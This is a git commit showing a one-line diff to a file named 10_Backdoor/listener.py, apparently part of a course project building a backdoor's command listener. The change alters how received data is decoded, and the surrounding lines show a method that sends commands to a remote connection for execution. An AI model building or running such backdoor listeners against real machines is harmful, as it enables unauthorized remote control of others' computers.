31d60caf214d0ebccd3b53bc80446ae75c260be3
Sumeet Singh <sumeet605@gmail.com>
2024-08-07 19:03:45 -0400

    f

--- 10_Backdoor/listener.py
+++ 10_Backdoor/listener.py
@@ -19,7 +19,7 @@ class Listener:
         
     def reliable_receive(self):
         json_data = json.dumps(self.connection.recv(1024).decode())
-        return str(bytes(json.loads(json_data), "utf-8").decode())
+        return bytes(json.loads(json_data), "utf-8").decode("unicode_escape")
 
     def execute_remotely(self, command):
         self.reliable_send(command)
